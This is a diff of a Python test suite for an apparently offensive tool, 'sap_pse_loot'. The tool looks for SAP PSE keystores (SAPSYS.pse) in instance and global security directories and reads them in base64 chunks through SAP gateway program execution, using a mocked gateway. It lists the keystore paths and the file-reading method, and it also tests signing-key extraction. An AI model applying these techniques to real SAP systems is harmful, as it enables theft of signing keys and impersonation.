@@ -111,12 +111,71 @@ def test_global_secudir_layout():
 
 def test_candidate_secudirs_ordering():
     """Per-instance must be tried BEFORE global -- it's the layout
-    that's specific to the dispatcher we have OS-exec on."""
+    that's specific to the dispatcher we have OS-exec on.
+
+    D<NN> input is expanded to all SAP instance dir patterns
+    (D, DVEBMGS, ASCS, SCS) so we catch central-instance layouts
+    like NPL's DVEBMGS42 from the instance number alone.
+    """
     from sap_pse_loot import candidate_secudirs
     cands = candidate_secudirs("S4H", "D00")
-    assert len(cands) == 2
+    # 4 instance variants + 1 global = 5
+    assert len(cands) == 5
     assert cands[0] == "/usr/sap/S4H/D00/sec"
-    assert cands[1] == "/usr/sap/S4H/SYS/global/security/data"
+    assert cands[1] == "/usr/sap/S4H/DVEBMGS00/sec"
+    assert cands[2] == "/usr/sap/S4H/ASCS00/sec"
+    assert cands[3] == "/usr/sap/S4H/SCS00/sec"
+    assert cands[-1] == "/usr/sap/S4H/SYS/global/security/data"
+
+
+def test_candidate_secudirs_includes_dvebmgs_for_central_instances():
+    """NPL central-instance layout: SAPSYS.pse lives in DVEBMGS42/sec.
+    Operator only has instance number 42 (from network scan), code must
+    expand D42 to also probe DVEBMGS42."""
+    from sap_pse_loot import candidate_secudirs
+    cands = candidate_secudirs("NPL", "D42")
+    assert "/usr/sap/NPL/D42/sec" in cands
+    assert "/usr/sap/NPL/DVEBMGS42/sec" in cands
+    assert "/usr/sap/NPL/ASCS42/sec" in cands
+    assert "/usr/sap/NPL/SCS42/sec" in cands
+
+
+def test_candidate_secudirs_extra_instance_nrs():
+    """When a node has multiple instances (e.g. NPL: 00 Java + 42 ABAP),
+    extra_instance_nrs lets the caller pass all of them so every
+    candidate is probed."""
+    from sap_pse_loot import candidate_secudirs
+    cands = candidate_secudirs("NPL", "D00", extra_instance_nrs=["42"])
+    # Primary 00 expands to 4, extra 42 expands to 4, plus global = 9
+    assert len(cands) == 9
+    assert "/usr/sap/NPL/D00/sec" in cands
+    assert "/usr/sap/NPL/DVEBMGS42/sec" in cands
+    assert "/usr/sap/NPL/SYS/global/security/data" in cands
+
+
+def test_candidate_secudirs_non_d_pattern_pass_through():
+    """If the caller already knows the exact instance dir name
+    (e.g. ASCS01 from a previous probe), it should pass through
+    without D<NN>-expansion."""
+    from sap_pse_loot import candidate_secudirs
+    cands = candidate_secudirs("PRD", "ASCS01")
+    assert cands[0] == "/usr/sap/PRD/ASCS01/sec"
+
+
+def test_candidate_secudirs_windows_paths():
+    """Windows uses backslash separators and C:\\usr\\sap by default."""
+    from sap_pse_loot import candidate_secudirs
+    cands = candidate_secudirs("PRD", "D00", os_type="windows")
+    assert all("\\" in c for c in cands)
+    assert cands[0] == r"C:\usr\sap\PRD\D00\sec"
+
+
+def test_expand_instance_nr_returns_all_four_patterns():
+    """The helper that expands a 2-digit instance number to all
+    SAP directory naming patterns."""
+    from sap_pse_loot import _expand_instance_nr
+    dirs = _expand_instance_nr("42")
+    assert dirs == ["D42", "DVEBMGS42", "ASCS42", "SCS42"]
 
 
 # ===========================================================================
@@ -1032,3 +1091,155 @@ class TestExtractSigningKey:
                                iterations=10000)
         r = extract_signing_key(pse, "pin")
         assert r["success"] is True
+
+
+# ===========================================================================
+# Chunked read adapter — python detection tests
+# ===========================================================================
+
+def _make_python_gw(filesystem, python3_ok=True, python_ok=True,
+                    python3_output=None):
+    """Build a gw_exec_fn that handles python/python3 -c calls.
+
+    filesystem maps paths to bytes (used by python chunk-read code).
+    python3_ok / python_ok control whether each interpreter "exists".
+    python3_output overrides the probe output for python3 (for testing
+    false-positive rejection).
+    """
+    calls = []
+
+    def gw_exec(program, args):
+        calls.append((program, args))
+        program = (program or "").strip()
+        args = (args or "").strip()
+
+        if program in ("python3", "python"):
+            is_py3 = program == "python3"
+            available = python3_ok if is_py3 else python_ok
+
+            if not available:
+                return {"success": True, "output": [
+                    "Can't exec external program (No such file or "
+                    "directory)"], "error": ""}
+
+            # Custom probe output for python3 (false-positive testing)
+            if is_py3 and python3_output is not None and \
+                    args == "-c print(42777)":
+                return {"success": True, "output": python3_output,
+                        "error": ""}
+
+            # Simulate real python: eval print(...) expressions
+            if args.startswith("-c "):
+                code = args[3:]
+                try:
+                    import io, contextlib, types
+                    buf = io.StringIO()
+                    # Build a fake os module with getsize support
+                    fake_os = types.ModuleType("os")
+                    fake_os.path = types.ModuleType("os.path")
+                    fake_os.path.getsize = lambda p: len(filesystem[p])
+                    fake_open = lambda p, m="r": (
+                        io.BytesIO(filesystem[p]) if "b" in m
+                        else io.StringIO(filesystem[p].decode()))
+                    ns = {"__builtins__": __builtins__,
+                          "open": fake_open}
+                    # Patch __import__ so `__import__('os')` returns
+                    # our fake os (for getsize), real imports otherwise
+                    real_import = __import__
+                    def _fake_import(name, *a, **kw):
+                        if name == "os":
+                            return fake_os
+                        return real_import(name, *a, **kw)
+                    ns["__import__"] = _fake_import
+                    with contextlib.redirect_stdout(buf):
+                        exec(code, ns)
+                    out = buf.getvalue().rstrip("\n")
+                    return {"success": True,
+                            "output": [out] if out else [],
+                            "error": ""}
+                except Exception as e:
+                    return {"success": False, "output": [],
+                            "error": str(e)}
+
+        # Pass through ls / base64 / etc via original _make_fake_gw logic
+        if program == "ls":
+            files = filesystem.get(args)
+            if files is None:
+                return {"success": False, "output": [], "error": ""}
+            return {"success": True, "output": files, "error": ""}
+
+        return {"success": False, "output": [],
+                "error": "unknown program"}
+
+    gw_exec.calls = calls
+    return gw_exec
+
+
+def test_chunked_adapter_detects_python3_first():
+    """When python3 is available, the adapter selects it on first probe."""
+    from sap_pse_loot import make_chunked_read_adapter
+    file_data = b"hello chunked world"
+    gw = _make_python_gw(
+        {"/tmp/test.bin": file_data},
+        python3_ok=True, python_ok=True)
+    adapted = make_chunked_read_adapter(gw, chunk_raw_bytes=72)
+    result = adapted("base64", "/tmp/test.bin")
+    assert result["success"] is True
+    # Verify python3 was the interpreter used (first call is the probe)
+    py_calls = [c for c in gw.calls if c[0] in ("python3", "python")]
+    assert py_calls[0][0] == "python3"
+    assert all(c[0] == "python3" for c in py_calls)
+
+
+def test_chunked_adapter_falls_back_to_python():
+    """When python3 returns SAPXPG 'no such file' error, fall back to
+    python (covers NPL / older systems)."""
+    from sap_pse_loot import make_chunked_read_adapter
+    file_data = b"fallback test"
+    gw = _make_python_gw(
+        {"/tmp/fb.bin": file_data},
+        python3_ok=False, python_ok=True)
+    adapted = make_chunked_read_adapter(gw, chunk_raw_bytes=72)
+    result = adapted("base64", "/tmp/fb.bin")
+    assert result["success"] is True
+    # python3 was tried but rejected; actual work done via python
+    py_calls = [c for c in gw.calls if c[0] in ("python3", "python")]
+    assert py_calls[0][0] == "python3"  # tried first
+    work_calls = [c for c in py_calls if c[1] != "-c print(42777)"]
+    assert all(c[0] == "python" for c in work_calls)
+
+
+def test_python_detection_rejects_false_positive():
+    """Old detection used `if "1" in output` which matched 'exit code 1'.
+    New detection uses print(42777) and checks for exact line '42777'.
+    Verify that a python3 whose probe output contains '1' but NOT
+    '42777' is correctly rejected."""
+    from sap_pse_loot import make_chunked_read_adapter
+    gw = _make_python_gw(
+        {"/tmp/x.bin": b"data"},
+        python3_ok=True, python_ok=True,
+        python3_output=["Can't exec external program",
+                        "External program terminated with exit code 1"])
+    adapted = make_chunked_read_adapter(gw, chunk_raw_bytes=72)
+    result = adapted("base64", "/tmp/x.bin")
+    assert result["success"] is True
+    # python3 was probed but rejected; work done via python
+    work_calls = [c for c in gw.calls
+                  if c[0] in ("python3", "python")
+                  and c[1] != "-c print(42777)"]
+    assert all(c[0] == "python" for c in work_calls)
+
+
+def test_chunked_adapter_reads_file_via_python_fallback():
+    """Full integration: no python3, working python, verify correct
+    decoded bytes are returned."""
+    from sap_pse_loot import make_chunked_read_adapter
+    file_data = b"\x00\x01\x02\xff" * 10  # 40 bytes, binary
+    gw = _make_python_gw(
+        {"/tmp/binary.dat": file_data},
+        python3_ok=False, python_ok=True)
+    adapted = make_chunked_read_adapter(gw, chunk_raw_bytes=72)
+    result = adapted("base64", "/tmp/binary.dat")
+    assert result["success"] is True
+    decoded = base64.b64decode(result["output"][0])
+    assert decoded == file_data
